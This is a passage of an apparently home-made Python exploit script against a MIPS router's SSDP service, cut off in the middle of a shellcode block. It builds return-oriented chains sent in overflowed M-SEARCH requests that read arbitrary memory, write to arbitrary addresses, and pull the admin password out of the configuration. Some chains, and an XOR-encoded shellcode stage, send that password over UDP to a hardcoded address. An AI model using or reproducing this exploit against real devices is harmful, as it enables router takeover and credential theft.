            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
            chain += b'b' * 0x18
            chain += p32(0xdecea5ed) # s0
            chain += p32(sockaddr_addr) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0x1746c8 + base_address) # ra

            ##########################################################################################################################################
            ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
            ##########################################################################################################################################

            # Move sockfd to a0 for connect
            # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x11e568 + base_address) # ra

            # Move 'hello' into a1 (clobbers v0 but thats fine)
            # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
            chain += p32(0x801d3754) # a1 (address of hello)
            chain += b'b' * 0x8
            chain += p32(0x100790 + base_address)

            # Set a2 to be the length of the string 'hello\0' 
            # 0x00100790: addiu $a2, $zero, 6; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 0x4
            chain += p32(0xbb6e4 + base_address)        

            # Set a3 to be zero (flags)
            # 0x000bb6e4: move $a3, $zero; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += b'b' * 0xc
            chain += p32(0x57864 + base_address)

            ## Set up sockaddr struct

            # s1 has our sockaddr address, load address of afinet into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += p32(harcdoded_afinet) # v0
            chain += b'b' * 8
            chain += p32(0x1a46dc + base_address)

            # Load hardcoded afinet stuff into v0 (currently has the address)
            # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 4
            chain += p32(0x13e134 + base_address)

            # Store the afinet stuff at our sockaddr struct
            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
            chain += b'b' * 4
            chain += p32(0xdecea5ed) # s0
            chain += p32(sockaddr_addr + 4) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x57864 + base_address) # ra

            # Load the IP address into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
            chain += b'b' * 8
            chain += p32(0x13e134 + base_address) # ra

            # Store the loaded IP address at sockaddr + 4
            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
            chain += b'b' * 4
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x57864 + base_address) # ra

            ## Load t0 value into v0
            # Load v0 from stack
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(sockaddr_addr) # v0 - sockaddr address
            chain += b'b' * 8
            chain += p32(0x15d20c + base_address) # ra

            # Move sockaddr from v0 into t0 (load v0 from stack, move into t0) #########Might need fixing need to check addresses!!!###########
            # 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
            #   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
            chain += b'b' * 0xc
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0xdecea5ed) # s4
            chain += p32(0xdecea5ed) # s5
            chain += p32(0xdecea5ed) # s6
            chain += p32(0xdecea5ed) # s7
            chain += p32(0x1895cc + base_address) # ra

            # Move 0x20 into t1
            # 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
            chain += b'b' * 0x20
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0x57864 + base_address) # ra

            # Load address of sendto into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(sendto_addr) # v0 - sendto address
            chain += b'b' * 8
            chain += p32(0x15114 + base_address) # ra

            # Call sendto and regain control
            # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 4
            chain += p32(0xdecea5ed)
        elif (args.rop[0] == '4'): # print the admin password to the uart using config get function
            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(0x80236c4c - 4) # s0 (0x1010200)
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x153d0 + base_address) # ra

            ###############################################
            ############## config function ################
            ###############################################

            # set a0 to be the id of the admin password
            # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += p32(config_get_addr + 0x7b58) # s0
            chain += p32(0x11e568 + base_address)

            # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(pwd_buffer)
            chain += b'b' * 0x8
            chain += p32(0x137960 + base_address)

            ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
            # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x15114 + base_address) # ra

            ## Now call config load
            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'b' * 0x4
            chain += p32(0x13478 + base_address) # ra

            ##################################################
            ############## print admin password ##############
            ##################################################

            # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'b' * 4
            chain += p32(pwd_buffer) # s0 ('on')
            chain += p32(0x801c3f91) # s1 ("%s")
            chain += p32(0x12ba10 + base_address) # ra
            
            # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x187a30 + base_address) # ra

            # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += b'a'*4
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0x57864 + base_address)

            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(0x8019a3a0) # v0 - printf address
            chain += b'a' * 8
            chain += p32(0x15114 + base_address) # ra

            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'a' * 4
            chain += p32(0xdecea5ed) # ra
        
        elif args.rop[0] == '5': # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(0xaaaaaaaa) # s0
            chain += p32(0xbbbbbbbb) # s1
            chain += p32(0xcccccccc) # s2
            chain += p32(0xdddddddd) # s3
            chain += p32(0x11e670 + base_address) # ra

            ####################################################################
            ########## int socket(int domain, int type, int protocol); #########
            ####################################################################

            # Set first argument for socket to 2
            # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += b'b'*4
            chain += p32(0x172e0c + base_address) # ra

            # Set second argument for socket to 2 
            # 0x00172e0c: move $a1, $zero; lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
            chain += b'b' * 0xc
            chain += p32(0x115428 + base_address)

            # 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x6d42c + base_address)

            # set third argument for socket to 0
            # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
            chain += b'b' * 4
            chain += p32(0x57864 + base_address) # ra

            # Load address of socket into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(socket_addr) # v0 - socket address
            chain += b'b' * 8
            chain += p32(0x133d58 + base_address) # ra

            # Call socket(2, 1, 0) and regain control
            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
            chain += b'b' * 0x18
            chain += p32(sockfd_addr) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0x185e38 + base_address) # ra

            # save the socket file descriptor for use later, might not use but oh well
            # 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0x80236c4c - 4) # s0 (0x1010200 address)
            chain += p32(0x153d0 + base_address) # ra

            ####################################################
            ############## config load function ################
            ####################################################

            # Set a0 to be the id of the admin password
            # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += p32(config_get_addr + 0x7b58) # s0
            chain += p32(0x11e568 + base_address)

            # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(pwd_buffer)
            chain += b'b' * 0x8
            chain += p32(0x137960 + base_address)

            ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
            # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x15114 + base_address) # ra

            ## Now call config load
            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'b' * 0x4
            chain += p32(0x19bc70 + base_address) # ra

            ##############################################
            ############### strlen (str) #################
            ##############################################

            # Regain control of s0
            # 0x0019bc70: lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(pwd_buffer) # s0
            chain += p32(0xb018c + base_address) # ra

            # Move pwd buffer address into a0
            # 0x000b018c: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x57864 + base_address) # ra

            # call strlen on the password buffer 

            # Load address of strlen into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(strlen_addr) # v0 - strlen address
            chain += b'b' * 8
            chain += p32(0x133d58 + base_address) # ra

            # Call strlen and regain control
            # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
            chain += b'b' * 0x18
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0x166168 + base_address) # ra

            # 0x00166168: move $v1, $v0; lw $ra, 4($sp); move $v0, $v1; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 4
            chain += p32(0x18f044 + base_address)

            # 0x0018f044: move $a2, $v1; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += b'b' * 0xc
            chain += p32(0x1a9f9c + base_address)

            ##########################################################################################################################################
            ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
            ##########################################################################################################################################

            # Load sockfd address into v0
            # 0x001a9f9c: lw $v0, ($sp); lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
            chain += p32(sockfd_addr) # v0
            chain += b'b' * 8
            chain += p32(0xdecea5ed) # s0
            chain += p32(sockaddr_addr) # s1
            chain += p32(0x1a46dc + base_address) # ra

            # Load sockfd value into v0
            # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 4
            chain += p32(0x1746c8 + base_address)

            # Move sockfd to a0 for connect
            # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x11e568 + base_address) # ra

            # Move admin pwd into a1
            # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
            chain += p32(pwd_buffer) # a1 (address of admin pwd)
            chain += b'b' * 0x8
            chain += p32(0xbb6e4 + base_address) # ra

            # Set a3 to be zero (flags)
            # 0x000bb6e4: move $a3, $zero; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += b'b' * 0xc
            chain += p32(0x57864 + base_address) # ra

            ## Set up sockaddr struct

            # s1 has our sockaddr address, load address of afinet into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += p32(harcdoded_afinet) # v0
            chain += b'b' * 8
            chain += p32(0x1a46dc + base_address) # ra

            # Load hardcoded afinet stuff into v0 (currently has the address)
            # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 4
            chain += p32(0x13e134 + base_address) # ra

            # Store the afinet stuff at our sockaddr struct
            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
            chain += b'b' * 4
            chain += p32(0xdecea5ed) # s0
            chain += p32(sockaddr_addr + 4) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x57864 + base_address) # ra

            # Load the IP address into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
            chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
            chain += b'b' * 8
            chain += p32(0x13e134 + base_address) # ra

            # Store the loaded IP address at sockaddr + 4
            # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
            chain += b'b' * 4
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0x57864 + base_address) # ra

            ## Load t0 value into v0
            # Load v0 from stack
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(sockaddr_addr) # v0 - sockaddr address
            chain += b'b' * 8
            chain += p32(0x15d20c + base_address) # ra

            # Move sockaddr from v0 into t0 (load v0 from stack, move into t0)
            # 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
            #   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
            chain += b'b' * 0xc
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0xdecea5ed) # s4
            chain += p32(0xdecea5ed) # s5
            chain += p32(0xdecea5ed) # s6
            chain += p32(0xdecea5ed) # s7
            chain += p32(0x1895cc + base_address) # ra

            # Move 0x20 into t1
            # 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
            chain += b'b' * 0x20
            chain += p32(0xdecea5ed) # s0
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0x57864 + base_address) # ra

            # Load address of sendto into v0
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(sendto_addr) # v0 - sendto address
            chain += b'b' * 8
            chain += p32(0x15114 + base_address) # ra

            # Call sendto and regain control
            # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
            chain += b'b' * 4
            chain += p32(0xdecea5ed) # ra
        elif (args.rop[0] == 'r'): # does a large hex dump at address specified in s0 (basically our way of reading arbitrary memory) - crashes task but not entire router
            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(0x801d3754) # s0 (address to read) - currently sp
            chain += p32(0xdecea5ed) # s1
            chain += p32(0xdecea5ed) # s2
            chain += p32(0xdecea5ed) # s3
            chain += p32(0xb0228 + base_address) # ra

            # Move address into a0
            # 0x000b0228: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
            chain += p32(0xdecea5ed) # s0
            chain += p32(0x71b68 + base_address) # ra

            # 0x00071b68: addiu $a1, $zero, 0x8bf; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'b' * 4
            chain += p32(0x57864 + base_address) # ra

            # # can use this to extend how much data is read
            # # 0x000142f0: addiu $a1, $a1, 0x4024; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8
            # chain += b'b' * 4
            # chain += p32(0x57864 + base_address) # ra

            # Call hexdump
            # Load and call hexdump
            # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(0x8019966c) # v0 - hexdump address
            chain += b'b' * 8
            chain += p32(0x15114 + base_address) # ra

            # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
            chain += b'b' * 4
            chain += p32(0x8019b118) # ra

            # chain += b'x' * 200
        elif args.rop[0] == 'nc': # demonstrates the lack of crash when setting overflowed registers
            '''
            - just s0 : crash, pc = 801888e0
                Except 5: AdES
                    z0=00000000 at=fffffffe v0=00000000 v1=00000041
                    a0=801f0000 a1=8025d521 a2=801ec064 a3=00000000
                    t0=80260000 t1=01010101 t2=00000001 t3=000000df
                    t4=0000000a t5=0000000d t6=802c5390 t7=00000020
                    s0=11111111 s1=8025d500 s2=802c5268 s3=802ab9f4
                    s4=801ef724 s5=11110015 s6=11110016 s7=11110017
                    t8=802b5a00 t9=00000006 k0=00000000 k1=00000000
                    gp=80269a60 sp=802ab9c0 fp=802aba20 ra=801888e0
                    pc=801888e0 sr=1000e403 cause=80000014, badva=1111116d

            - Expected values of overwritten registers (found via trial and error):
                - s0 : 0x802c0004
                - s1 : 0x8025d500
                - s2 : 0x802C5268
                - s3 : 0x802ab9f4
                - ra : 0x801888e0
            '''
            
            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(0x802c0404) # s0
            chain += p32(0x8025d504) # s1
            chain += p32(0x802C5268) # s2
            chain += p32(0x802ab9f4) # s3
            chain += p32(0x801888e0) # ra
        elif args.rop[0] == 'w': # achieving arbitrary write with no crash
            address_to_write = 0x801d3754
            value_to_write = 0x62626262

            # Add the strings to the sX registers, and set the ra to first gadget
            chain += p32(value_to_write) # s0
            chain += p32(address_to_write) # s1
            chain += p32(0x802C5268) # s2
            chain += p32(0x802ab9f4) # s3
            chain += p32(0x8013be14) # ra

            # 0x8013be14: sw $s0, ($s1); lw $ra, 0xc($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
            chain += p32(0x802c0404) # s0
            chain += p32(0x8025d504) # s1
            chain += p32(0x802C5268) # s2
            chain += p32(0x801888e8) # ra
        else:
            print("[-] Bad type")
            exit(1)

        print(f"Length used: {len(chain)}")
        print(hexdump(chain))
    
        # Build the request
        request = b"M-SEARCH * HTTP/1.0\r\n"
        request += b"HOST:239.255.255.250:1900\r\n"
        request += b"ST:uuid:" + chain + b"\r\n"
        request += b"MX:2\r\n"
        request += b"MAN:\"ssdp:discover\"\r\n\r\n"
        
        # Create socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.connect((args.ip, 1900))

        # Send the request
        s.sendall(request)
        s.close()
    elif args.shellcode:
        base_address = 0x80000400
        if args.shellcode[0] == '1':
            context.update(arch='mips', os='linux', bits=32, endian='little')

            decode_shellcode = asm('''
        /* We provided the length of the shellcode (encoded) in s2, so lets decode that */
            xor $s2, $s2, $s3;
        /* Current shellcode address is in s1 (should be okay to pass straight in, basically the first encoded shellcode thing)
        /* s0 will contain the value we are decoding */
          loop:
        /* load the shellcode value to decode */
            lw $s0, 0x1010($s1);
        /* decode the value */
            xor $s0, $s0, $s3;
        /* save value to location it was got from */
            sw $s0, 0x1010($s1)
        /* decrease s2 by 4 so we can check if all decoded, decrease decoding address */
            addiu $s2, $s2, -0x4;
            addiu $s1, $s1, 0x108;
        /* do some branch stuff if s2 is 0 */
            bgtz $s2, loop;
            addiu $s1, $s1, -0x104;
        /* fix v0 (in branch delay slot) */
            xor $v0, $s3, $s3;
        /* fix s0 (0x802c0404) */
            lui $t0, 0x802c;
            ori $s0, $t0, 0x0404;
        /* fix s1 (0x8025d504) */
            lui $s1, 0x8025;
            ori $s1, $s1, 0x0504;
        /* fix s2 (0x802C5268) */
            ori $s2, $t0, 0x5268;
        /* fix s3 (0x802ab9f4) */
            lui $s3, 0x802a;
            ori $s3, $s3, 0xb9f4;
        /* Fix up stack once shellcode done */
            addiu $sp, $sp, 0xfff;
            j 0x801888e0;
            addiu $sp, $sp, -0xfef;
            ''')

            test_shellcode = asm('''
            move $a0, $s2;
            move $a1, $s1;
            jalr $s3;
            nop;
            j 0x802C3638;   /* fix address */
            xor $v0, $s3, $s3;
            ''')

            # Write our shellcode to memory with a bunch of overflows
            decoder_addr = 0x802c3614
            shellcode_addr = decoder_addr + len(decode_shellcode)

            # Write decoder shellcode
            for i in range(int(len(decode_shellcode)/4)):
                pos = i * 4
                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
                write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))

            for i in range(int(len(test_shellcode)/4)):
                pos = i * 4
                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
                write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)

            print(f"Decoder address: {hex(decoder_addr)}")
            print(hexdump(decode_shellcode))
            print(f"Shellcode address: {hex(shellcode_addr)}")
            print(hexdump(test_shellcode))
            print(f"Encoded shellcode:")
            encoded_shellcode = b''
            for i in test_shellcode:
                encoded_shellcode += (i ^ 0xf6).to_bytes(1, 'big')
            print(hexdump(encoded_shellcode))

            #### Now call the decoder shellcode
            payload = b'b' * 132

            payload += p32(0x802c0404) # s0
            payload += p32(shellcode_addr - 0x1010) # s1
            payload += p32(len(test_shellcode) ^ 0xf6f6f6f6) # s2
            payload += p32(0xf6f6f6f6) # s3
            payload += p32(decoder_addr) # ra

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:uuid:" + payload + b"\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            print("Decoding payload...")
            s.sendall(request)
            s.close()

            #### then call the decoded shellcode
            payload = b'b' * 132

            time.sleep(1) # sleep before sending so the caches get flushed

            payload += p32(0x802c0404) # s0
            payload += p32(0x801efa04) # s1 (string address) # 801c0528
            payload += p32(0x801c3f91) # s2 (%s address)
            payload += p32(0x8019a3a0) # s3 (printf address)
            payload += p32(shellcode_addr) # ra
        
            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:uuid:" + payload + b"\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            print("Triggering payload...")
            s.sendall(request)
            s.close()
        elif args.shellcode[0] == '2':
            context.update(arch='mips', os='linux', bits=32, endian='little')

            decode_shellcode = asm('''
        /* We provided the length of the shellcode (encoded) in s2, so lets decode that */
            xor $s2, $s2, $s3;
        /* Current shellcode address is in s1 (should be okay to pass straight in, basically the first encoded shellcode thing)
        /* s0 will contain the value we are decoding */
          loop:
        /* load the shellcode value to decode */
            lw $s0, 0x1010($s1);
        /* decode the value */
            xor $s0, $s0, $s3;
        /* save value to location it was got from */
            sw $s0, 0x1010($s1)
        /* decrease s2 by 4 so we can check if all decoded, decrease decoding address */
            addiu $s2, $s2, -0x4;
            addiu $s1, $s1, 0x108;
        /* do some branch stuff if s2 is 0 */
            bgtz $s2, loop;
            addiu $s1, $s1, -0x104;
        /* fix v0 (in branch delay slot) */
            xor $v0, $s3, $s3;
        /* fix s0 (0x802c0404) */
            lui $t0, 0x802c;
            ori $s0, $t0, 0x0404;
        /* fix s1 (0x8025d504) */
            lui $s1, 0x8025;
            ori $s1, $s1, 0x0504;
        /* fix s2 (0x802C5268) */
            ori $s2, $t0, 0x5268;
        /* fix s3 (0x802ab9f4) */
            lui $s3, 0x802a;
            ori $s3, $s3, 0xb9f4;
        /* Fix up stack once shellcode done */
            addiu $sp, $sp, 0xfff;
            j 0x801888e0;
            addiu $sp, $sp, -0xfef;
            ''')

            test_shellcode = asm('''
            lw $a0, ($s1);      /* s1 contains address of 0x1010200 */
            lui $v0, 0x8000;
            or $v0, 0x89e4;
            jalr $v0;           /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
            move $a1, $s2;      /* s2 contains pwd buffer address */
            jalr $s0;           /* len = strlen(pwd_buffer (0x801d3754)) */
            move $a0, $s2;      /* s2 contains pwd buffer address */
            move $s0, $v0;      /* v0 contains length of password */
            /* create sockaddr stuff and put into t0 */
            lui $v0, 0x800f;
            or $v0, $v0, 0x9528;
            lw $v0, ($v0);      /* load value of hardcoded_afinet into v0 */
            lui $t0, 0x802a;
            or $s1, $t0, 0xbf10;
            sw $v0, ($s1);      /* save hardcoded_afinet value to address of sockaddr */
            addiu $t0, $s1, 0x4;
            lui $v0, 0x02bc;
            or $v0, $v0, 0xa8c0;
            sw $v0, ($t0);      /* save hardcoded IP address to sockaddr + 4 */
            addiu $a0, $zero, 2;
            addiu $a1, $zero, 2;
            jalr $s3;           /* socket(2, 2, 0) - s3 contains address of socket()*/
            move $a2, $zero;
            move $a0, $v0;      /* v0 contains sockfd_address */
            move $a1, $s2;      /* s2 contains pwd buffer address */
            move $a2, $s0;      /* s0 contains pwd length */
            move $a3, $zero;
            move $t0, $s1;      /* s1 contains the address of sockaddr */
            lui $v0, 0x8012;
            or $v0, $v0, 0x8bc4;
